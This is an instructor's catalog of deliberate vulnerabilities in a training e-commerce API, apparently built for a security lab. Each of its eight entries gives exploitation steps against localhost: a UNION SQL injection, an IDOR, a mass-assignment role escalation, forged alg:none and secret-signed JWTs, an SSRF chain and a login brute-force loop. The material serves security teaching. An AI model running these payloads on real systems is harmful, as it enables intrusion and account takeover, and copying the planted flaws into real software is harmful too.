# ShopWorthy API — Vulnerability Catalog

> **Instructor-facing document.** Documents every intentional vulnerability in the `api` repository.

---

## VULN-API-001 — SQL Injection on Product Search

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-001 |
| **Type** | SQL Injection |
| **OWASP** | A03:2021 – Injection |
| **Severity** | Critical |
| **File** | `src/routes/products.js` ~line 16 |

### Description
The `?search=` query parameter is interpolated directly into the SQL query string with no sanitization. An attacker can break out of the LIKE clause and inject arbitrary SQL.

### Exploitation Steps
1. Send a search request with a UNION payload:

```bash
curl "http://localhost:4000/api/products?search=' UNION SELECT id,username,password,email,role,null,null FROM users--"
```

2. The response includes the users table with MD5 password hashes.

---

## VULN-API-002 — Broken Object Level Authorization (BOLA/IDOR) on Orders

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-002 |
| **Type** | BOLA / IDOR |
| **OWASP** | A01:2021 – Broken Access Control |
| **Severity** | High |
| **File** | `src/routes/orders.js` ~lines 50, 60 |

### Description
`GET /api/orders` returns ALL orders with no user filter. `GET /api/orders/:id` returns any order by ID without checking if the authenticated user owns it.

### Exploitation Steps
```bash
TOKEN="<customer1 JWT>"
# Get all orders (including other users')
curl -H "Authorization: Bearer $TOKEN" http://localhost:4000/api/orders

# Access another user's order directly
curl -H "Authorization: Bearer $TOKEN" http://localhost:4000/api/orders/1
```

---

## VULN-API-003 — Mass Assignment on User Update

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-003 |
| **Type** | Mass Assignment |
| **OWASP** | A03:2021 – Injection |
| **Severity** | High |
| **File** | `src/routes/users.js` ~line 30 |

### Description
The entire request body is applied to `UPDATE users SET ...` with no field whitelist. An attacker can escalate their own role to `admin`.

### Exploitation Steps
```bash
TOKEN="<customer1 JWT>"
USER_ID=2
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  http://localhost:4000/api/users/$USER_ID
```

---

## VULN-API-004 — JWT `alg:none` Acceptance

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-004 |
| **Type** | Broken Authentication |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Severity** | Critical |
| **File** | `src/middleware/auth.js` ~line 10 |

### Description
The JWT verification middleware accepts `alg: none`, which allows an attacker to craft a token with no signature. Any payload can be used to impersonate any user.

### Exploitation Steps
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"id":1,"username":"admin","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Use forged token
import requests
r = requests.get('http://localhost:4000/api/auth/me', headers={'Authorization': f'Bearer {token}'})
print(r.json())
```

---

## VULN-API-005 — Hardcoded JWT Secret and Weak Default

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-005 |
| **Type** | Sensitive Data Exposure |
| **OWASP** | A02:2021 – Cryptographic Failures |
| **Severity** | High |
| **File** | `src/middleware/auth.js` line 10, `src/routes/auth.js` line 7 |

### Description
The JWT secret fallback `'shopworthy-secret-2024'` is hardcoded in source and committed to the repository. Any attacker can use this secret to sign valid tokens for any user.

### Exploitation Steps
```python
import jwt
token = jwt.encode({"id":1,"username":"admin","role":"admin"}, "shopworthy-secret-2024", algorithm="HS256")
```

---

## VULN-API-006 — Unauthenticated Internal Config Endpoint

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-006 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | High |
| **File** | `src/routes/internal.js` ~line 10 |

### Description
`GET /internal/config` returns the JWT secret, database path, and internal service URLs with no authentication. Exploitable directly or via SSRF from the inventory service (VULN-INV-001).

### Exploitation Steps
```bash
# Direct access
curl http://localhost:4000/internal/config

# Via inventory SSRF
curl -X POST "http://localhost:5000/webhooks/notify?callback_url=http://api:4000/internal/config&product_id=1&quantity=1"
```

---

## VULN-API-007 — No Rate Limiting

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-007 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | Medium |
| **File** | `src/index.js` |

### Description
No rate limiting middleware is applied to any endpoint. The authentication endpoint can be brute-forced without any throttling.

### Exploitation Steps
```bash
# Brute force login
for pass in password123 admin123 shopworthy letmein; do
  curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}" \
    http://localhost:4000/api/auth/login
done
```

---

## VULN-API-008 — Verbose Error Responses (Stack Trace Disclosure)

| Field | Detail |
|-------|--------|
| **ID** | VULN-API-008 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | Low |
| **File** | `src/index.js` (global error handler), all route catch blocks |

### Description
All error responses include the full `err.stack` in the JSON response. This leaks internal file paths, library versions, and application structure.

### Exploitation Steps
```bash
# Trigger an error with a malformed request
curl -X PUT -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalid" \
  http://localhost:4000/api/users/1
# Response includes stack trace
```
